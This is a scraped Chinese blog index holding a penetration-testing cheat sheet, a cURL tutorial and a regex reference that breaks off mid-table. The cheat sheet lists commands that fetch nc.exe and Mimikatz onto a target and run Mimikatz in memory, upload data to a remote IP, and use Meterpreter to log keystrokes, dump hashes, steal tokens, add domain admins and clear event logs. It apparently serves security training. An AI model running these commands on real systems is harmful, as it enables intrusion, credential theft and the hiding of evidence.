<td>base64&#96;</td>
</tr>
<tr>
<td>&#96;echo ENCODED_B64</td>
<td>base64 -d&#96;</td>
</tr>
<tr>
<td>&#96;echo hackthebox</td>
<td>xxd -p&#96;</td>
</tr>
<tr>
<td>&#96;echo ENCODED_HEX</td>
<td>xxd -p -r&#96;</td>
</tr>
<tr>
<td>&#96;echo hackthebox</td>
<td>tr ‘A-Za-z’ ‘N-ZA-Mn-za-m’&#96;</td>
</tr>
<tr>
<td>&#96;echo ENCODED_ROT13</td>
<td>tr ‘A-Za-z’ ‘N-ZA-Mn-za-m’&#96;</td>
</tr>
</tbody></table>
<h1 id="Deobfuscation-Websites"><a href="#Deobfuscation-Websites" class="headerlink" title="Deobfuscation Websites"></a>Deobfuscation Websites</h1><table>
<thead>
<tr>
<th><strong>Website</strong></th>
</tr>
</thead>
<tbody><tr>
<td><a target="_blank" rel="noopener" href="https://jsconsole.com/">JS Console</a></td>
</tr>
<tr>
<td><a target="_blank" rel="noopener" href="https://prettier.io/playground/">Prettier</a></td>
</tr>
<tr>
<td><a target="_blank" rel="noopener" href="https://beautifier.io/">Beautifier</a></td>
</tr>
<tr>
<td><a target="_blank" rel="noopener" href="http://www.jsnice.org/">JSNice</a></td>
</tr>
</tbody></table>
<p>##文件传输</p>
<table>
<thead>
<tr>
<th><code>Invoke-WebRequest https://&lt;snip&gt;/PowerView.ps1 -OutFile PowerView.ps1</code></th>
<th>使用 PowerShell 下载文件</th>
</tr>
</thead>
<tbody><tr>
<td><code>IEX (New-Object Net.WebClient).DownloadString(&#39;https://&lt;snip&gt;/Invoke-Mimikatz.ps1&#39;)</code></td>
<td>使用 PowerShell 在内存中执行文件</td>
</tr>
<tr>
<td><code>Invoke-WebRequest -Uri http://10.10.10.32:443 -Method POST -Body $b64</code></td>
<td>使用 PowerShell 上传文件</td>
</tr>
<tr>
<td><code>bitsadmin /transfer n http://10.10.10.32/nc.exe C:\Temp\nc.exe</code></td>
<td>使用 Bitsadmin 下载文件</td>
</tr>
<tr>
<td><code>certutil.exe -verifyctl -split -f http://10.10.10.32/nc.exe</code></td>
<td>使用 Certutil 下载文件</td>
</tr>
<tr>
<td><code>wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh -O /tmp/LinEnum.sh</code></td>
<td>使用 Wget 下载文件</td>
</tr>
<tr>
<td><code>curl -o /tmp/LinEnum.sh https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh</code></td>
<td>使用 cURL 下载文件</td>
</tr>
<tr>
<td><code>php -r &#39;$file = file_get_contents(&quot;https://&lt;snip&gt;/LinEnum.sh&quot;); file_put_contents(&quot;LinEnum.sh&quot;,$file);&#39;</code></td>
<td>使用 PHP 下载文件</td>
</tr>
<tr>
<td><code>scp C:\Temp\bloodhound.zip user@10.10.10.150:/tmp/bloodhound.zip</code></td>
<td>使用 SCP 上传文件</td>
</tr>
<tr>
<td><code>scp user@target:/tmp/mimikatz.exe C:\Temp\mimikatz.exe</code></td>
<td>使用 SCP 下载文件</td>
</tr>
<tr>
<td><code>Invoke-WebRequest http://nc.exe -UserAgent [Microsoft.PowerShell.Commands.PSUserAgent]::Chrome -OutFile &quot;nc.exe&quot;</code></td>
<td>使用 Chrome 用户代理的 Invoke-WebRequest</td>
</tr>
</tbody></table>
<h3 id="MSF"><a href="#MSF" class="headerlink" title="MSF"></a>MSF</h3><table>
<thead>
<tr>
<th><code>show exploits</code></th>
<th>显示框架内的所有漏洞。</th>
</tr>
</thead>
<tbody><tr>
<td><code>show payloads</code></td>
<td>显示框架中的所有有效负载。</td>
</tr>
<tr>
<td><code>show auxiliary</code></td>
<td>显示框架中的所有辅助模块。</td>
</tr>
<tr>
<td><code>search &lt;name&gt;</code></td>
<td>在框架中搜索漏洞或模块。</td>
</tr>
<tr>
<td><code>info</code></td>
<td>加载有关特定漏洞利用或模块的信息。</td>
</tr>
<tr>
<td><code>use &lt;name&gt;</code></td>
<td>加载漏洞利用或模块（例如：使用 Windows&#x2F;smb&#x2F;psexec）。</td>
</tr>
<tr>
<td><code>use &lt;number&gt;</code></td>
<td>使用搜索命令后显示的索引号加载漏洞利用。</td>
</tr>
<tr>
<td><code>LHOST</code></td>
<td>目标可访问的本地主机 IP 地址，如果不在本地网络上，通常是公共 IP 地址。通常用于反向壳。</td>
</tr>
<tr>
<td><code>RHOST</code></td>
<td>远程主机或目标。set函数 设置特定值（例如，LHOST 或 RHOST）。</td>
</tr>
<tr>
<td><code>setg &lt;function&gt;</code></td>
<td>全局设置特定值（例如，LHOST 或 RHOST）。</td>
</tr>
<tr>
<td><code>show options</code></td>
<td>显示可用于模块或漏洞利用的选项。</td>
</tr>
<tr>
<td><code>show targets</code></td>
<td>显示漏洞利用支持的平台。</td>
</tr>
<tr>
<td><code>set target &lt;number&gt;</code></td>
<td>如果您知道操作系统和服务包，请指定特定的目标索引。</td>
</tr>
<tr>
<td><code>set payload &lt;payload&gt;</code></td>
<td>指定要使用的有效负载。</td>
</tr>
<tr>
<td><code>set payload &lt;number&gt;</code></td>
<td>指定要在显示有效负载命令后使用的有效负载索引号。</td>
</tr>
<tr>
<td><code>show advanced</code></td>
<td>显示高级选项。</td>
</tr>
<tr>
<td><code>set autorunscript migrate -f</code></td>
<td>漏洞利用完成后自动迁移到单独的进程。</td>
</tr>
<tr>
<td><code>check</code></td>
<td>确定目标是否容易受到攻击。</td>
</tr>
<tr>
<td><code>exploit</code></td>
<td>执行模块或利用并攻击目标。</td>
</tr>
<tr>
<td><code>exploit -j</code></td>
<td>在作业上下文中运行漏洞利用。（这将在后台运行漏洞利用。</td>
</tr>
<tr>
<td><code>exploit -z</code></td>
<td>成功利用漏洞后不要与会话交互。</td>
</tr>
<tr>
<td><code>exploit -e &lt;encoder&gt;</code></td>
<td>指定要使用的有效负载编码器（例如：exploit –e shikata_ga_nai）。</td>
</tr>
<tr>
<td><code>exploit -h</code></td>
<td>显示漏洞利用命令的帮助。</td>
</tr>
<tr>
<td><code>sessions -l</code></td>
<td>列出可用会话（在处理多个 shell 时使用）。</td>
</tr>
<tr>
<td><code>sessions -l -v</code></td>
<td>列出所有可用会话并显示详细字段，例如利用系统时使用了哪个漏洞。</td>
</tr>
<tr>
<td><code>sessions -s &lt;script&gt;</code></td>
<td>在所有 Meterpreter 实时会话上运行特定的 Meterpreter 脚本。</td>
</tr>
<tr>
<td><code>sessions -K</code></td>
<td>终止所有实时会话。</td>
</tr>
<tr>
<td><code>sessions -c &lt;cmd&gt;</code></td>
<td>在所有实时 Meterpreter 会话上执行命令。</td>
</tr>
<tr>
<td><code>sessions -u &lt;sessionID&gt;</code></td>
<td>将普通的 Win32 外壳升级到 Meterpreter 控制台。</td>
</tr>
<tr>
<td><code>db_create &lt;name&gt;</code></td>
<td>创建用于数据库驱动攻击的数据库（例如：db_create autopwn）。</td>
</tr>
<tr>
<td><code>db_connect &lt;name&gt;</code></td>
<td>创建并连接到用于驱动攻击的数据库（例如：db_connect autopwn）。</td>
</tr>
<tr>
<td><code>db_nmap</code></td>
<td>使用 Nmap 并将结果放入数据库中。（支持正常的 Nmap 语法，例如 –sT –v –P0。</td>
</tr>
<tr>
<td><code>db_destroy</code></td>
<td>删除当前数据库。</td>
</tr>
<tr>
<td><code>db_destroy &lt;user:password@host:port/database&gt;</code></td>
<td>使用高级选项删除数据库。</td>
</tr>
<tr>
<td></td>
<td></td>
</tr>
</tbody></table>
<hr>
<h2 id="仪表管理员命令"><a href="#仪表管理员命令" class="headerlink" title="仪表管理员命令"></a>仪表管理员命令</h2><table>
<thead>
<tr>
<th><strong>命令</strong></th>
<th><strong>描述</strong></th>
</tr>
</thead>
<tbody><tr>
<td><code>help</code></td>
<td>打开 Meterpreter 使用帮助。</td>
</tr>
<tr>
<td><code>run &lt;scriptname&gt;</code></td>
<td>运行基于 Meterpreter 的脚本;有关完整列表，请查看 scripts&#x2F;meterpreter 目录。</td>
</tr>
<tr>
<td><code>sysinfo</code></td>
<td>显示有关受损目标的系统信息。</td>
</tr>
<tr>
<td><code>ls</code></td>
<td>列出目标上的文件和文件夹。</td>
</tr>
<tr>
<td><code>use priv</code></td>
<td>加载扩展的 Meterpreter 库的权限扩展。</td>
</tr>
<tr>
<td><code>ps</code></td>
<td>显示所有正在运行的进程以及与每个进程关联的帐户。</td>
</tr>
<tr>
<td><code>migrate &lt;proc. id&gt;</code></td>
<td>迁移到特定进程 ID（PID 是从 ps 命令获取的目标进程 ID）。</td>
</tr>
<tr>
<td><code>use incognito</code></td>
<td>加载隐身功能。（用于目标计算机上的令牌窃取和模拟。</td>
</tr>
<tr>
<td><code>list_tokens -u</code></td>
<td>按用户列出目标上的可用令牌。</td>
</tr>
<tr>
<td><code>list_tokens -g</code></td>
<td>按组列出目标上的可用令牌。</td>
</tr>
<tr>
<td><code>impersonate_token &lt;DOMAIN_NAMEUSERNAME&gt;</code></td>
<td>模拟目标上可用的令牌。</td>
</tr>
<tr>
<td><code>steal_token &lt;proc. id&gt;</code></td>
<td>窃取可用于给定进程的令牌并模拟该令牌。</td>
</tr>
<tr>
<td><code>drop_token</code></td>
<td>停止模拟当前令牌。</td>
</tr>
<tr>
<td><code>getsystem</code></td>
<td>尝试通过多个攻击媒介将权限提升为 SYSTEM 级访问权限。</td>
</tr>
<tr>
<td><code>shell</code></td>
<td>放入包含所有可用令牌的交互式外壳中。</td>
</tr>
<tr>
<td><code>execute -f &lt;cmd.exe&gt; -i</code></td>
<td>执行cmd.exe并与之交互。</td>
</tr>
<tr>
<td><code>execute -f &lt;cmd.exe&gt; -i -t</code></td>
<td>使用所有可用的令牌执行 cmd.exe。</td>
</tr>
<tr>
<td><code>execute -f &lt;cmd.exe&gt; -i -H -t</code></td>
<td>使用所有可用的令牌执行cmd.exe并使其成为隐藏进程。</td>
</tr>
<tr>
<td><code>rev2self</code></td>
<td>恢复为用于破坏目标的原始用户。</td>
</tr>
<tr>
<td><code>reg &lt;command&gt;</code></td>
<td>在目标注册表中进行交互、创建、删除、查询、设置等。</td>
</tr>
<tr>
<td><code>setdesktop &lt;number&gt;</code></td>
<td>根据登录者切换到其他屏幕。</td>
</tr>
<tr>
<td><code>screenshot</code></td>
<td>截取目标屏幕的屏幕截图。</td>
</tr>
<tr>
<td><code>upload &lt;filename&gt;</code></td>
<td>将文件上传到目标。</td>
</tr>
<tr>
<td><code>download &lt;filename&gt;</code></td>
<td>从目标下载文件。</td>
</tr>
<tr>
<td><code>keyscan_start</code></td>
<td>开始在远程目标上嗅探击键。</td>
</tr>
<tr>
<td><code>keyscan_dump</code></td>
<td>转储在目标上捕获的远程密钥。</td>
</tr>
<tr>
<td><code>keyscan_stop</code></td>
<td>停止在远程目标上嗅探击键。</td>
</tr>
<tr>
<td><code>getprivs</code></td>
<td>在目标上获得尽可能多的权限。</td>
</tr>
<tr>
<td><code>uictl enable &lt;keyboard/mouse&gt;</code></td>
<td>控制键盘和&#x2F;或鼠标。</td>
</tr>
<tr>
<td><code>background</code></td>
<td>在后台运行您当前的 Meterpreter shell。</td>
</tr>
<tr>
<td><code>hashdump</code></td>
<td>在目标上转储所有哈希。使用嗅探器 加载嗅探器模块。</td>
</tr>
<tr>
<td><code>sniffer_interfaces</code></td>
<td>列出目标上的可用接口。</td>
</tr>
<tr>
<td><code>sniffer_dump &lt;interfaceID&gt; pcapname</code></td>
<td>开始在远程目标上嗅探。</td>
</tr>
<tr>
<td><code>sniffer_start &lt;interfaceID&gt; packet-buffer</code></td>
<td>从特定范围的数据包缓冲区开始嗅探。</td>
</tr>
<tr>
<td><code>sniffer_stats &lt;interfaceID&gt;</code></td>
<td>从您正在嗅探的界面中获取统计信息。</td>
</tr>
<tr>
<td><code>sniffer_stop &lt;interfaceID&gt;</code></td>
<td>停止嗅探器。</td>
</tr>
<tr>
<td><code>add_user &lt;username&gt; &lt;password&gt; -h &lt;ip&gt;</code></td>
<td>在远程目标上添加用户。</td>
</tr>
<tr>
<td><code>add_group_user &lt;&quot;Domain Admins&quot;&gt; &lt;username&gt; -h &lt;ip&gt;</code></td>
<td>将用户名添加到远程目标上的域管理员组。</td>
</tr>
<tr>
<td><code>clearev</code></td>
<td>清除目标计算机上的事件日志。</td>
</tr>
<tr>
<td><code>timestomp</code></td>
<td>更改文件属性，例如创建日期（反取证度量）。</td>
</tr>
<tr>
<td><code>reboot</code></td>
<td>重新启动目标计算机。</td>
</tr>
</tbody></table>

            
        </div>
    </div>

    <div class="post-tags">
        
        <span class="icon">
            <a-icon type="tags" theme="filled" />
        </span>
        
        
        <span class="tag">
            
            <a href="/tags/备忘录" style=color:#00a596>
                备忘录
            </a>
        </span>
        
    </div>

    <a href="/2023/06/11/chat_sheet/ " class="go-post">
        阅读全文
    </a>
</div>

<div class="post">

    <a href="/2023/06/11/cURL/">
        <h2>
            cURL
        </h2>
    </a>

    <div class="category-and-date">

        

        <span class="date">
            <span class="icon">
                <a-icon type="calendar" theme="filled" />
            </span>
            2023/6/11
        </span>

    </div>

    <div class="excerpt">
        <div class="content" v-pre>
            
            
            <h1 id="cURL"><a href="#cURL" class="headerlink" title="cURL"></a>cURL</h1><p>####将内容输出到文件中： -O   -o</p>
<p>我们看到cURL不像web浏览器那样呈现HTML&#x2F;JavaScript&#x2F;CSS代码，而是以原始格式打印它。然而，作为渗透测试人员，我们主要对请求和响应上下文感兴趣，它通常比web浏览器更快、更方便。<br>我们也可以使用cURL下载页面或文件，并使用-O标志将内容输出到文件中。如果我们想指定输出文件名，我们可以使用-o标志并指定名称。否则，我们可以使用-O，cURL将使用远程文件名，如下所示：</p>
<pre><code>Tanin@htb[/htb]$ curl inlanefreight.com

&lt;!DOCTYPE HTML PUBLIC &quot;-//IETF//DTD HTML 2.0//EN&quot;&gt;
&lt;html&gt;&lt;head&gt;
...SNIP...
</code></pre>
<pre><code>Tanin@htb[/htb]$ curl -O inlanefreight.com/index.html
Tanin@htb[/htb]$ ls
index.html
</code></pre>
<h4 id="跳过cURL的证书检查：-k"><a href="#跳过cURL的证书检查：-k" class="headerlink" title="跳过cURL的证书检查：-k"></a>跳过cURL的证书检查：-k</h4><p>现代网络浏览器也会这样做，警告用户不要访问具有无效SSL证书的网站。<br>我们在测试本地web应用程序或使用托管用于实践目的的web应用程序时可能会面临这样的问题，因为此类web应用程序可能尚未实现有效的SSL证书。要跳过cURL的证书检查，我们可以使用-k标志：</p>
<pre><code>Tanin@htb[/htb]$ curl -k https://inlanefreight.com

&lt;!DOCTYPE HTML PUBLIC &quot;-//IETF//DTD HTML 2.0//EN&quot;&gt;
&lt;html&gt;&lt;head&gt;
...SNIP...
</code></pre>
<h4 id="查看完整的HTTP请求和响应：-v"><a href="#查看完整的HTTP请求和响应：-v" class="headerlink" title="查看完整的HTTP请求和响应：-v"></a>查看完整的HTTP请求和响应：-v</h4><p>在我们前面的cURL示例中，我们只指定了URL，并得到了返回的响应体。然而，cURL还允许我们预览完整的HTTP请求和完整的HTTP响应，这在执行web渗透测试或编写漏洞时会变得非常方便。要查看完整的HTTP请求和响应，我们可以简单地在前面的命令中添加-v verbose标志，它应该同时打印请求和响应：</p>
<pre><code>Tanin@htb[/htb]$ curl inlanefreight.com -v

*   Trying SERVER_IP:80...
* TCP_NODELAY set
* Connected to inlanefreight.com (SERVER_IP) port 80 (#0)
&gt; GET / HTTP/1.1
&gt; Host: inlanefreight.com
&gt; User-Agent: curl/7.65.3
&gt; Accept: */*
&gt; Connection: close
&gt; 
* Mark bundle as not supporting multiuse
&lt; HTTP/1.1 401 Unauthorized
&lt; Date: Tue, 21 Jul 2020 05:20:15 GMT
&lt; Server: Apache/X.Y.ZZ (Ubuntu)
&lt; WWW-Authenticate: Basic realm=&quot;Restricted Content&quot;
&lt; Content-Length: 464
&lt; Content-Type: text/html; charset=iso-8859-1
&lt; 
&lt;!DOCTYPE HTML PUBLIC &quot;-//IETF//DTD HTML 2.0//EN&quot;&gt;
&lt;html&gt;&lt;head&gt;

...SNIP...
</code></pre>
<p>-vvv标志显示了一个更加详细的输出。</p>
<h4 id="只显示响应标头：-i"><a href="#只显示响应标头：-i" class="headerlink" title="只显示响应标头：-i"></a>只显示响应标头：-i</h4><p>我们看到了将-v标志与cURL一起使用如何向我们显示HTTP请求和响应的全部细节。如果我们只对查看响应标头感兴趣，那么我们可以使用-I标志发送HEAD请求，并且只显示响应标头。此外，我们可以使用-i标志来显示标题和响应主体（例如HTML代码）。两者的区别在于，-I发送一个HEAD请求（将在下一节中看到），而-I发送我们指定的任何请求并打印头。<br>以下命令显示了使用-I标志的示例输出：</p>
<pre><code>curl -I https://www.inlanefreight.com

Host: www.inlanefreight.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_5) AppleWebKit/605.1.15 (KHTML, like Gecko)
Cookie: cookie1=298zf09hf012fh2; cookie2=u32t4o3tb3gg4
Accept: text/plain
Referer: https://www.inlanefreight.com/
Authorization: BASIC cGFzc3dvcmQK

Date: Sun, 06 Aug 2020 08:49:37 GMT
Connection: keep-alive
Content-Length: 26012
Content-Type: text/html; charset=ISO-8859-4
Content-Encoding: gzip
Server: Apache/2.2.14 (Win32)
Set-Cookie: name1=value1,name2=value2; Expires=Wed, 09 Jun 2021 10:18:14 GMT
WWW-Authenticate: BASIC realm=&quot;localhost&quot;
Content-Security-Policy: script-src &#39;self&#39;
Strict-Transport-Security: max-age=31536000
Referrer-Policy: origin
</code></pre>
<h4 id="设置请求标头：-H"><a href="#设置请求标头：-H" class="headerlink" title="设置请求标头：-H"></a>设置请求标头：-H</h4><p>除了查看标头之外，cURL还允许我们使用-H标志设置请求标头，这将在后面的部分中看到。有些标头，如用户代理或Cookie标头，有自己的标志。例如，我们可以使用-A来设置我们的用户代理，如下所示：</p>
<pre><code>Tanin@htb[/htb]$ curl https://www.inlanefreight.com -A &#39;Mozilla/5.0&#39;

&lt;!DOCTYPE HTML PUBLIC &quot;-//IETF//DTD HTML 2.0//EN&quot;&gt;
&lt;html&gt;&lt;head&gt;
...SNIP...
</code></pre>
<p>当我们使用基本的HTTP auth时，我们看到我们的HTTP请求将Authorization头设置为basic YWRtaW46YWRtaW4&#x3D;，这是admin:admin的base64编码值。如果我们使用现代的身份验证方法（例如JWT），则授权类型为Bearer，并且将包含更长的加密令牌。<br>让我们尝试在不提供凭据的情况下手动设置授权，看看它是否允许我们访问该页面。我们可以使用-H标志设置头，并将使用上面HTTP请求中的相同值。我们可以多次添加-H标志来指定多样（ multiple ？）标头：</p>
<pre><code>Tanin@htb[/htb]$ curl -H &#39;Authorization: Basic YWRtaW46YWRtaW4=&#39; http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/

&lt;!DOCTYPE html
&lt;html lang=&quot;en&quot;&gt;

&lt;head&gt;
...SNIP...
</code></pre>
<h4 id="HTTP-Basic-Auth：-u"><a href="#HTTP-Basic-Auth：-u" class="headerlink" title="HTTP Basic Auth：-u"></a>HTTP Basic Auth：-u</h4><p>当我们访问本节末尾的练习时，它会提示我们输入用户名和密码。与使用HTTP参数来验证用户凭据（例如POST请求）的常见登录表单不同，这种类型的身份验证使用基本的HTTP身份验证，由web服务器直接处理，以保护特定的页面&#x2F;目录，而无需直接与web应用程序交互。<br>要访问该页面，我们必须输入一对有效的凭据，在这种情况下为admin:admin：</p>
<pre><code>Tanin@htb[/htb]$ curl -u admin:admin http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/

&lt;!DOCTYPE html&gt;
&lt;html lang=&quot;en&quot;&gt;

&lt;head&gt;
...SNIP...
</code></pre>
<p>这一次我们确实得到了响应中的页面。还有另一种方法，我们可以提供基本的HTTP身份验证凭据，它直接通过URL作为（username:password@URL)，正如我们在第一节中所讨论的。如果我们对cURL或浏览器进行同样的尝试，我们也可以访问该页面：</p>
<pre><code>Tanin@htb[/htb]$ curl http://admin:admin@&lt;SERVER_IP&gt;:&lt;PORT&gt;/

&lt;!DOCTYPE html&gt;
&lt;html lang=&quot;en&quot;&gt;

&lt;head&gt;
...SNIP...
</code></pre>
<h4 id="用户代理：-A"><a href="#用户代理：-A" class="headerlink" title="用户代理：-A"></a>用户代理：-A</h4><p>浏览器通常会在请求头中发送用户代理信息，以告诉服务器使用的是哪个浏览器及其版本。而 <code>curl</code> 命令默认情况下发送的请求没有用户代理信息，可能会导致服务器返回不同的结果或者是基于用户代理的动态网页内容。</p>
<p>您可以尝试使用 <code>-A</code> 或 <code>--user-agent</code> 参数在 <code>curl</code> 命令中设置一个用户代理，以模拟特定的浏览器行为，例如：</p>
<pre><code>curl -A &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.150 Safari/537.36&quot; &lt;URL&gt;
</code></pre>
<h4 id="Cookie：-b-–cookie"><a href="#Cookie：-b-–cookie" class="headerlink" title="Cookie：-b  –cookie"></a>Cookie：-b  –cookie</h4><p>浏览器通常会在请求头中发送与该网站相关的 Cookie 信息，以便服务器可以识别用户并提供相应的内容。而 <code>curl</code> 命令默认情况下不会自动发送 Cookie。</p>
<p>如果该网站依赖于 Cookie 来提供特定的内容或功能，您可以使用 <code>-b</code> 或 <code>--cookie</code> 参数在 <code>curl</code> 命令中设置一个或多个 Cookie 值，以模拟浏览器发送的 Cookie 信息。</p>
<pre><code>curl -b &quot;cookie1=value1; cookie2=value2&quot; &lt;URL&gt;
</code></pre>
<h4 id="重定向：-L-–location"><a href="#重定向：-L-–location" class="headerlink" title="重定向：-L   –location"></a>重定向：-L   –location</h4><p>浏览器通常会自动处理服务器返回的重定向（例如，HTTP 3xx 状态码），并在必要时自动跳转到新的 URL。而 <code>curl</code> 命令默认情况下不会自动处理重定向。</p>
<p>如果服务器返回了重定向响应，您可以使用 <code>-L</code> 或 <code>--location</code> 参数来让 <code>curl</code> 命令自动跟随重定向，并获取最终的内容。</p>
<pre><code>curl -L &lt;URL&gt;
</code></pre>
<p>####请求方式：-X</p>
<pre><code>Tanin@htb[/htb]$ curl -X POST -d &#39;username=admin&amp;password=admin&#39; http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/

...SNIP...
        &lt;em&gt;Type a city name and hit &lt;strong&gt;Enter&lt;/strong&gt;&lt;/em&gt;
...SNIP...
</code></pre>
<pre><code>Tip: Many login forms would redirect us to a different page once authenticated (e.g. /dashboard.php). If we want to follow the redirection with cURL, we can use the -L flag.
</code></pre>
<h5 id="POST"><a href="#POST" class="headerlink" title="POST"></a>POST</h5><p>​	我们将使用-X POST标志来发送POST请求。然后，为了添加POST数据，我们可以使用-d标志并在其后面添加上述数据，如下所示：</p>
<pre><code>Tanin@htb[/htb]$ curl -X POST -d &#39;username=admin&amp;password=admin&#39; http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/

...SNIP...
        &lt;em&gt;Type a city name and hit &lt;strong&gt;Enter&lt;/strong&gt;&lt;/em&gt;
...SNIP...
</code></pre>
<p>有了经过身份验证的cookie，我们现在应该能够与web应用程序交互，而无需每次都提供凭据。为了测试这一点，我们可以在cURL中设置带有-b标志的上述cookie，如下所示：</p>
<pre><code>Tanin@htb[/htb]$ curl -b &#39;PHPSESSID=c1nsa6op7vtk7kdis7bcnbadf1&#39; http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/

...SNIP...
        &lt;em&gt;Type a city name and hit &lt;strong&gt;Enter&lt;/strong&gt;&lt;/em&gt;
...SNIP...
</code></pre>
<p>正如我们所看到的，我们确实通过了身份验证并进入了搜索功能。也可以将cookie指定为标头，如下所示：</p>
<pre><code>curl -H &#39;Cookie: PHPSESSID=c1nsa6op7vtk7kdis7bcnbadf1&#39; http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/
</code></pre>
<h4 id="格式化json-：-jq"><a href="#格式化json-：-jq" class="headerlink" title="格式化json ：| jq"></a>格式化json ：| jq</h4><p>我们看到结果是以JSON字符串的形式发送的。为了将其正确格式化为JSON格式，我们可以将输出通过管道传输到jq实用程序，后者将正确格式化它。我们还将使用-s静音任何不需要的cURL输出，如下所示：</p>
<pre><code>Tanin@htb[/htb]$ curl http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/api.php/city/london

[&#123;&quot;city_name&quot;:&quot;London&quot;,&quot;country_name&quot;:&quot;(UK)&quot;&#125;]
</code></pre>
<pre><code>Tanin@htb[/htb]$ curl -s http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/api.php/city/london | jq

[
  &#123;
    &quot;city_name&quot;: &quot;London&quot;,
    &quot;country_name&quot;: &quot;(UK)&quot;
  &#125;
]
</code></pre>

            
        </div>
    </div>

    <div class="post-tags">
        
        <span class="icon">
            <a-icon type="tags" theme="filled" />
        </span>
        
        
        <span class="tag">
            
            <a href="/tags/base" style=color:#00bcd4>
                base
            </a>
        </span>
        
    </div>

    <a href="/2023/06/11/cURL/ " class="go-post">
        阅读全文
    </a>
</div>

<div class="post">

    <a href="/2023/06/11/Regular_operations/">
        <h2>
            正则运算
        </h2>
    </a>

    <div class="category-and-date">

        

        <span class="date">
            <span class="icon">
                <a-icon type="calendar" theme="filled" />
            </span>
            2023/6/11
        </span>

    </div>

    <div class="excerpt">
        <div class="content" v-pre>
            
            
            <h1 id="正则运算"><a href="#正则运算" class="headerlink" title="正则运算"></a>正则运算</h1><h2 id="修饰符"><a href="#修饰符" class="headerlink" title="修饰符"></a>修饰符</h2><p>修饰符用于执行区分大小写和全局匹配:</p>
<table>
<thead>
<tr>
<th>修饰符</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td><a target="_blank" rel="noopener" href="https://www.runoob.com/js/jsref-regexp-i.html">i</a></td>
<td>执行对大小写不敏感的匹配。</td>
</tr>
<tr>
<td><a target="_blank" rel="noopener" href="https://www.runoob.com/js/jsref-regexp-g.html">g</a></td>
<td>执行全局匹配（查找所有匹配而非在找到第一个匹配后停止）。</td>
</tr>
<tr>
<td>m</td>
<td>执行多行匹配。</td>
</tr>
</tbody></table>
<h2 id="方括号"><a href="#方括号" class="headerlink" title="方括号"></a>方括号</h2><p>方括号用于查找某个范围内的字符：</p>
<table>
<thead>
<tr>
<th>表达式</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>[<a target="_blank" rel="noopener" href="https://www.runoob.com/jsref/jsref-regexp-charset.html">abc]</a></td>
<td>查找方括号之间的任何字符。</td>
</tr>
<tr>
<td>[<a target="_blank" rel="noopener" href="https://www.runoob.com/jsref/jsref-regexp-charset-not.html">^abc]</a></td>
<td>查找任何不在方括号之间的字符。</td>
</tr>
<tr>
<td>[0-9]</td>
<td>查找任何从 0 至 9 的数字。</td>
</tr>
<tr>
<td>[a-z]</td>
<td>查找任何从小写 a 到小写 z 的字符。</td>
</tr>
<tr>
<td>[A-Z]</td>
<td>查找任何从大写 A 到大写 Z 的字符。</td>
</tr>
<tr>
<td>[A-z]</td>
<td>查找任何从大写 A 到小写 z 的字符。</td>
</tr>
<tr>
<td>[adgk]</td>
<td>查找给定集合内的任何字符。</td>
</tr>
<tr>
<td>[^adgk]</td>
<td>查找给定集合外的任何字符。</td>
</tr>
<tr>
<td>(red|blue|green)</td>
<td>查找任何指定的选项。</td>
</tr>
</tbody></table>
<h2 id="元字符"><a href="#元字符" class="headerlink" title="元字符"></a>元字符</h2><p>元字符（Metacharacter）是拥有特殊含义的字符：</p>
<table>
<thead>
<tr>
<th>元字符</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td><a target="_blank" rel="noopener" href="https://www.runoob.com/jsref/jsref-regexp-dot.html">.</a></td>
<td>查找单个字符，除了换行和行结束符。</td>
</tr>
<tr>
<td><a target="_blank" rel="noopener" href="https://www.runoob.com/jsref/jsref-regexp-wordchar.html">\w</a></td>
<td>查找数字、字母及下划线。</td>
</tr>
<tr>
<td><a target="_blank" rel="noopener" href="https://www.runoob.com/jsref/jsref-regexp-wordchar-non.html">\W</a></td>
<td>查找非单词字符。</td>
</tr>
<tr>
<td><a target="_blank" rel="noopener" href="https://www.runoob.com/jsref/jsref-regexp-digit.html">\d</a></td>
<td>查找数字。</td>
</tr>
<tr>
<td><a target="_blank" rel="noopener" href="https://www.runoob.com/jsref/jsref-regexp-digit-non.html">\D</a></td>
<td>查找非数字字符。</td>
</tr>
<tr>
<td><a target="_blank" rel="noopener" href="https://www.runoob.com/jsref/jsref-regexp-whitespace.html">\s</a></td>
<td>查找空白字符。</td>
</tr>
<tr>
<td><a target="_blank" rel="noopener" href="https://www.runoob.com/jsref/jsref-regexp-whitespace-non.html">\S</a></td>
<td>查找非空白字符。</td>
</tr>
<tr>
<td><a target="_blank" rel="noopener" href="https://www.runoob.com/jsref/jsref-regexp-begin.html">\b</a></td>
<td>匹配单词边界。</td>
</tr>
<tr>
<td><a target="_blank" rel="noopener" href="https://www.runoob.com/jsref/jsref-regexp-begin-not.html">\B</a></td>
<td>匹配非单词边界。</td>
</tr>
<tr>
<td>\0</td>
<td>查找 NULL 字符。</td>
</tr>
<tr>
<td><a target="_blank" rel="noopener" href="https://www.runoob.com/jsref/jsref-regexp-newline.html">\n</a></td>
<td>查找换行符。</td>
</tr>
<tr>
<td>\f</td>
<td>查找换页符。</td>
</tr>
<tr>
<td>\r</td>
<td>查找回车符。</td>
</tr>
<tr>
<td>\t</td>
<td>查找制表符。</td>
</tr>
<tr>
<td>\v</td>
<td>查找垂直制表符。</td>
</tr>
<tr>
<td><a target="_blank" rel="noopener" href="https://www.runoob.com/jsref/jsref-regexp-octal.html">\xxx</a></td>
<td>查找以八进制数 xxx 规定的字符。</td>
</tr>
<tr>
<td><a target="_blank" rel="noopener" href="https://www.runoob.com/jsref/jsref-regexp-hex.html">\xdd</a></td>
<td>查找以十六进制数 dd 规定的字符。</td>
</tr>
<tr>
